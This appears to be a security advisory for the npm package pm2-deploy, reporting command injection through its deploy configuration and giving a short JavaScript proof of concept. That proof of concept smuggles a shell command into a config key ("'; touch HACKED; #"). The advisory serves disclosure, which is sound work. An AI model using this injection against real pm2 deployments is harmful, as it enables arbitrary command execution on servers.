# Overview
`pm2-deploy` is a module that allows to do pm2 deploy. Documentation: http://pm2.keymetrics.io/docs/usage/deployment/

Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands by using malicious `config` in the `spawn()` function.

# Proof of Concept
```js
var deployForEnv = require('pm2-deploy').deployForEnv;

var deployConfig = {
  prod: {
    "'; touch HACKED; # user": 'node',
    host: '127.0.0.1',
    ref: 'origin/master',
    repo: 'git@github.com:Asjidkalam/test-repo.git',
    path: '/var/www/test-dev'
  }
};

deployForEnv(deployConfig, 'prod', [], function (err, args) {
  if (err) {
    console.error('Deploy failed:', err.message);
    return console.error(err.stack);
  }
  console.log('Success!');
});
```
